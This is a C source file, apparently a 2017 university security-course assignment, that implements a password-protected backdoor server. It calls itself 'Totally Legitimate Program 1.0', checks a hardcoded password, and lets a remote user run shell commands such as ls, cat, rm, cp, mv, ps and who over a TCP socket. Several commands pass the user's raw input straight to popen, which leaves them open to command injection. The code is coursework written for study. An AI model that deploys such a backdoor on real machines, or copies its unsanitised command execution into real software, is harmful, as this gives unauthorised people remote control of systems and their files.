/*******************************************************************************************
*	CPSC 526 Fall 2017																	   *
* 	Tutorial 3																			   *
* 	Assignment 2																		   *
* 	Group: Marcin M. Malec 10042244, and Nathan Dien 10162905							   *
* 	This program uses the secretServer.c code from professor Pavol Federl				   *
*	This program uses the calling an external process [c] code from professor Pavol Federl *
*																						   *
*******************************************************************************************/

/*****************************
*	Commands || Status		 *
*	pwd		 ||	Complete	 *
*	cd		 ||	Not Complete *
*	ls		 ||	Complete	 *
*	cp		 ||	Partial 	 *
*	mv		 ||	Partial 	 *
*	rm		 ||	Partial	     *
*	cat		 ||	Complete	 *
*	snap	 ||	Not Complete *
*	diff	 ||	Not Complete *
*	help	 ||	Complete	 *
*	logout	 ||	Complete	 *
*	off		 ||	Complete	 *
*	who		 ||	Complete	 *
*	ps		 ||	Complete	 *
*****************************/

/***********************************************************************
* NOTE: Partial Status means that the command performs its function,   *
* But does also allow additional functionality as it would normally do *
* For example cp is meant to copy file1 to file2,					   *
* but will also copy files to a directory as normal					   *
***********************************************************************/

#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdarg.h>
#include <ctype.h>

// Constants
#define BUFFSIZE 1024

// global variables nicely grouped
struct {
    int port; // listening port
	char password[32]; // required password
    char buffer[BUFFSIZE]; // temporary buffer for input
	char temp[BUFFSIZE];
    //char secret[1024]; // the secret to reveal
} globals;

// report error message & exit
void die( const char * errorMessage, ...) {
    fprintf( stderr, "Error: ");
    va_list args;
    va_start( args, errorMessage);
    vfprintf( stderr, errorMessage, args);
    fprintf( stderr, "\n");
    va_end( args);
    exit(-1);
}

// read a line of text from file descriptor into provided buffer
void readLineFromFd( int fd, char * buff, size_t buffLength) {
    char * ptr = buff;
    
    //Count ensures that program does not write past bounds of buffer
    int count = (int)buffLength;
    
    //Exits loop upon count reaching 1 (buffer length reached)
    while(count > 1) {
        // try to read in the next character from fd, exit loop on failure
        if( read( fd, ptr, 1) < 1) break;
        // character stored, now advance ptr and decrement count
        ptr ++;
        count --;
        // if last character read was a newline, exit loop
        if( * (ptr - 1) == '\n') break;
    }
    // rewind ptr to the last read character
    ptr --;
    // trim trailing spaces (including new lines, telnet's \r's)
    while(ptr > buff && isspace(* ptr)) ptr --;
    // terminate the string
    * (ptr + 1) = '\0';
}

// write a string to file descriptor
int writeStrToFd( int fd, char * str) {
   return write( fd, str, strlen( str));
}

int main( int argc, char ** argv)
{
	int off = 0;
	int logout;
	FILE *fp;
	int status;
	char buff[BUFFSIZE];
    // parse command line arguments
    if( argc != 2) die( "Usage: server port");
    char * end = NULL;
    globals.port = strtol( argv[1], & end, 10);
    if( * end != 0) die( "bad port %s", argv[1]);
	strcpy(globals.password, "pass");
    // create a listenning socket on a given port
    struct sockaddr_in servaddr;
    int listenSockFd = socket(AF_INET, SOCK_STREAM, 0);
    if( listenSockFd < 0) die("socket() failed");
    bzero( (char *) & servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htons(INADDR_ANY);
    servaddr.sin_port = htons(globals.port);
    if( bind(listenSockFd, (struct sockaddr *) & servaddr, sizeof(servaddr)) < 0)
        die( "Could not bind listening socket: %s", strerror( errno));

    // listen for a new connection
    if( listen(listenSockFd, 3) != 0)
        die( "Could not listen for incoming connections.");

	/**************
	* Listen Here *
	**************/
    while(!off) {
        printf( "Waiting for a new connection...\n");
        // accept a new connection
        int connSockFd = accept(listenSockFd, NULL, NULL);
        if( connSockFd < 0) die( "accept() failed: %s", strerror(errno));
        printf( "Talking to someone.\n");
        // sey hello to the other side
        writeStrToFd( connSockFd, "Totally Legitimate Program 1.0\nPlease enter the password.\n");
        //Calculates the length of buffer
        size_t length = ( sizeof(globals.buffer) / sizeof(globals.buffer[0]));
        // read response from socket
        readLineFromFd( connSockFd, globals.buffer, length);
        // check if it was a correct password
        printf("%s vs. %s\n", globals.password, globals.buffer);
		
		/*****************
		* Enter Password *
		*****************/
        if( strcmp( globals.buffer, globals.password) == 0) {
            // password was correct, cont
            printf( "Password entered correctly.\n");
			writeStrToFd( connSockFd, "Password entered correctly.\nBackdoor 1.0\n");
			logout = 0;
			/**************
			* Listen Here *
			**************/
			while(!logout) {
				writeStrToFd( connSockFd, "Please enter a command: ");
				readLineFromFd( connSockFd, globals.buffer, length);
				/* pwd: Return the current working directory */
				if (strcmp(globals.buffer, "pwd") == 0) {
					fp = popen("pwd", "r");
					if (fp == NULL) {
						/* Error */
						die("File pointer = NULL");
					}
					while (fgets(buff, BUFFSIZE, fp) != NULL) {
						printf("%s", buff);
						writeStrToFd( connSockFd, ("%s", buff));
					}
					status = pclose(fp);
					if (status == -1) {
						/* Error */
						die("Error in pwd pclose: %s", strerror(errno));
					}
					else {
						/* Check status codes */
					}
				}
				/* cd <dir>: Change the current working directory to <dir> */
				else if (strncmp(globals.buffer, "cd", 2) == 0) {
					/* Add code */
				}
				/* ls: List the contents of the current working directory */
				else if (strcmp(globals.buffer, "ls") == 0) {
					fp = popen("ls", "r");
					if (fp == NULL) {
						die("File pointer = NULL");
					}
					while (fgets(buff, BUFFSIZE, fp) != NULL) {
						printf("%s", buff);
						writeStrToFd( connSockFd, ("%s", buff));
					}
					status = pclose(fp);
					if (status == -1) {
						die("Error in ls pclose: %s", strerror(errno));
					}
					else {
						/* Check status codes */
					}
				}
				/* cp <file1> <file2>: Copy <file> to <file2> */
				else if (strncmp(globals.buffer, "cp", 2) == 0) {
					if (strncmp(globals.buffer, "cp ", 3) == 0) {
						fp = popen(globals.buffer, "r");
						if (fp == NULL) {
							die("File pointer = NULL");
						}
						while (fgets(buff, BUFFSIZE, fp) != NULL) {
							printf("%s", buff);
							writeStrToFd( connSockFd, ("%s", buff));
						}
						status = pclose(fp);
						printf("%d\n", status);
						if (status == -1) {
							die("Error in cp pclose: %s", strerror(errno));
						}
						else if (status == 0) {
							writeStrToFd(connSockFd, "File copied\n");
						}
						/* No such file or directory/Is a directory error */
						else if (status == 256) {
							writeStrToFd(connSockFd, "Usage: mv <file1> <file2n>\n");
						}
					}
					else {
						writeStrToFd(connSockFd, "Usage: mv <file1> <file2>\n");
					}
				}
				/* mv <file1> <file2>: Rename <file> to <file2> */
				else if (strncmp(globals.buffer, "mv", 2) == 0) {
					if (strncmp(globals.buffer, "mv ", 3) == 0) {
						fp = popen(globals.buffer, "r");
						if (fp == NULL) {
							die("File pointer = NULL");
						}
						while (fgets(buff, BUFFSIZE, fp) != NULL) {
							printf("%s", buff);
							writeStrToFd( connSockFd, ("%s", buff));
						}
						status = pclose(fp);
						printf("%d\n", status);
						if (status == -1) {
							die("Error in mv pclose: %s", strerror(errno));
						}
						else if (status == 0) {
							writeStrToFd(connSockFd, "File name changed\n");
						}
						/* No such file or directory/Is a directory error */
						else if (status == 256) {
							writeStrToFd(connSockFd, "Usage: mv <file> <file>\n");
						}
					}
					else {
						writeStrToFd(connSockFd, "Usage: mv <file> <file>\n");
					}
				}
				/* rm <file>: Delete <file> */
				else if (strncmp(globals.buffer, "rm", 2) == 0) {
					if (strncmp(globals.buffer, "rm ", 3) == 0) {
						if (globals.buffer[3] == ' ' || globals.buffer[3] == '\0') {
							writeStrToFd( connSockFd, "Usage: rm <file>\n");
						}
						else {
							/* Remove all white space */
							for (int i = 4; i <BUFFSIZE; i++) {
								if (globals.buffer[i] == ' ') {
									for (int j = i; j < BUFFSIZE-1; j++) {
										globals.buffer[j] = globals.buffer[j+1];
									}
								}
							}
							fp = popen(globals.buffer, "r");
							if (fp == NULL) {
								die("File pointer = NULL");
							}
							while (fgets(buff, BUFFSIZE, fp) != NULL) {
								printf("%s", buff);
								writeStrToFd( connSockFd, ("%s", buff));
							}
							printf("File deleted\n");
							writeStrToFd(connSockFd, "File deleted\n");
							status = pclose(fp);
							if (status == -1) {
								die("Error in rm pclose: %s", strerror(errno));
							}
							/* No such file or directory/Is a directory error */
							else if (status == 256) {
								writeStrToFd(connSockFd, "No such file\n");
							}	
						}
					}
					else {
						writeStrToFd( connSockFd, "Usage: rm <file>\n");
					}
				}
				/* cat <file>: Return contents of <file> */
				else if (strncmp(globals.buffer, "cat", 3) == 0) {
					if (strncmp(globals.buffer, "cat ", 4) == 0) {
						if (globals.buffer[4] == ' ' || globals.buffer[4] == '\0') {
							writeStrToFd( connSockFd, "Usage: cat <file>\n");
						}
						else {
							/* Remove all white space */
							for (int i = 5; i <BUFFSIZE; i++) {
								if (globals.buffer[i] == ' ') {
									for (int j = i; j < BUFFSIZE-1; j++) {
										globals.buffer[j] = globals.buffer[j+1];
									}
								}
							}
							fp = popen(globals.buffer, "r");
							if (fp == NULL) {
								die("File pointer = NULL");
							}
							while (fgets(buff, BUFFSIZE, fp) != NULL) {
								printf("%s", buff);
								writeStrToFd( connSockFd, ("%s", buff));
							}
							printf("\n");
							writeStrToFd(connSockFd, "\n");
							status = pclose(fp);
							if (status == -1) {
								die("Error in cat pclose: %s", strerror(errno));
							}
							/* No such file or directory/Is a directory error */
							else if (status == 256) {
								writeStrToFd(connSockFd, "No such file\n");
							}	
						}
					}
					else {
						writeStrToFd( connSockFd, "Usage: cat <file>\n");
					}
				}	
				/* snap: Take snapshot of all files in the current directory and store it in memory */
				else if (strcmp(globals.buffer, "sanp") == 0) {
					/* Add code */
				}
				/* diff: Compare the contents of the current directory to the saved sanpshot */
				else if (strcmp(globals.buffer, "diff") == 0) {
					/* Add code */
				}
				/* who: list user[s] currently logged in */
				else if (strcmp(globals.buffer, "who") == 0) {
					fp = popen("who", "r");
					if (fp == NULL) {
						die("File pointer = NULL");
					}
					while (fgets(buff, BUFFSIZE, fp) != NULL) {
						printf("%s", buff);
						writeStrToFd( connSockFd, ("%s", buff));
					}
					status = pclose(fp);
					if (status == -1) {
						die("Error in who pclose: %s", strerror(errno));
					}
					else {
						/* Check status codes */
					}
				}
				/* ps: Show currently running processes */
				else if (strcmp(globals.buffer, "ps") == 0) {
					fp = popen("ps", "r");
					if (fp == NULL) {
						die("File pointer = NULL");
					}
					while (fgets(buff, BUFFSIZE, fp) != NULL) {
						printf("%s", buff);
						writeStrToFd( connSockFd, ("%s", buff));
					}
					status = pclose(fp);
					if (status == -1) {
						die("Error in ps pclose: %s", strerror(errno));
					}
					else {
						/* Check status codes */
					}
				}
				/* help: print list of commands, or print specified command function */
				else if (strncmp(globals.buffer, "help", 4) == 0) {
					/* Only help was entered */
					if (strcmp(globals.buffer, "help") == 0) {
						printf("Help command entered.\n");
						writeStrToFd(connSockFd, "pwd, cd, ls, cp, mv, rm, cat, snap, diff, help, logout, off, who, ps.\n");
					}
					/* Additional parameter */
					else if (strcmp(globals.buffer, "help pwd") == 0) {
						printf("Help command entered: pwd command.\n");
						writeStrToFd(connSockFd, "Returns the current working directory.\n");
					}
					else if (strcmp(globals.buffer, "help cd") == 0) {
						printf("Help command entered: cd command.\n");
						writeStrToFd(connSockFd, "Usage: cd <dir>.\nChange the current working directory to <dir>.\n");
					}
					else if (strcmp(globals.buffer, "help ls") == 0) {
						printf("Help command entered: ls command.\n");
						writeStrToFd(connSockFd, "Usage: ls.\nList the contents of the current working directory.\n");
					}
					else if (strcmp(globals.buffer, "help cp") == 0) {
						printf("Help command entered: cp command.\n");
						writeStrToFd(connSockFd, "Usage: cp <file1> <file2>.\nCopy <file1> to <file2>.\n");
					}
					else if (strcmp(globals.buffer, "help mv") == 0) {
						printf("Help command entered: mv command.\n");
						writeStrToFd(connSockFd, "Usage: mv <file1> <file2>.\nRename <file1> to <file2>.\n");
					}
					else if (strcmp(globals.buffer, "help rm") == 0) {
						printf("Help command entered: rm command.\n");
						writeStrToFd(connSockFd, "Usage: rm <file>.\nDelete <file>.\n");
					}
					else if (strcmp(globals.buffer, "help cat") == 0) {
						printf("Help command entered: cat command.\n");
						writeStrToFd(connSockFd, "Usage: cat <file>.\nReturn contents of the file.\n");
					}
					else if (strcmp(globals.buffer, "help snap") == 0) {
						printf("Help command entered: snap command.\n");
						writeStrToFd(connSockFd, "Usage: snap.\nTake snapshot of all the files in the current directory and store it in memory.\n");
					}
					else if (strcmp(globals.buffer, "help diff") == 0) {
						printf("Help command entered: diff command.\n");
						writeStrToFd(connSockFd, "Usage: diff.\nCompare the contents of the current directory to the saved snapshot.\n");
					}
					else if (strcmp(globals.buffer, "help logout") == 0) {
						printf("Help command entered: logout command.\n");
						writeStrToFd(connSockFd, "Usage: logout.\nDisconnect from the server.\n");
					}
					else if (strcmp(globals.buffer, "help off") == 0) {
						printf("Help command entered: off command.\n");
						writeStrToFd(connSockFd, "Usage: off.\nTerminate the backdoor program.\n");
					}
					else if (strcmp(globals.buffer, "help who") == 0) {
						printf("Help command entered: who command.\n");
						writeStrToFd(connSockFd, "Usage: who.\nList user[s] currently logged in.\n");
					}
					else if (strcmp(globals.buffer, "help ps") == 0) {
						printf("Help command entered: ps command.\n");
						writeStrToFd(connSockFd, "Usage: ps.\nShow currently running processes.\n");
					}
					/* help: Incorrect usage */
					else {
						printf("Help command entered: Incorrect usage.\n");
						writeStrToFd(connSockFd, "Usage: help or help <command>.\n");
					}
				}
				/* logout: Logout the user */
				else if (strcmp(globals.buffer, "logout") == 0) {
					logout = 1;
					printf("Logging out user\n");
					writeStrToFd( connSockFd, "Goodbye\n");
				}
				/* off: Logout user and terminate program */
				else if (strcmp(globals.buffer, "off") == 0) {
					off = 1;
					logout = 1;
					printf("Program terminating\n");
					writeStrToFd( connSockFd, "Terminating program.\n");
				}
				/* Incorrect command */
				else {
					printf("Incorrect command entered.\n");
					writeStrToFd( connSockFd, "Sorry, I don't understand this command.\n");
				}
			}
        }
        else {
            // password was incorrect
            printf( "Someone used an incorrect password.\n");
            writeStrToFd( connSockFd, "Nothing to see here, move along\n");
        }
        // close the connection
        close( connSockFd);
    }
	// close the socket
    close( listenSockFd);
    return 0;
}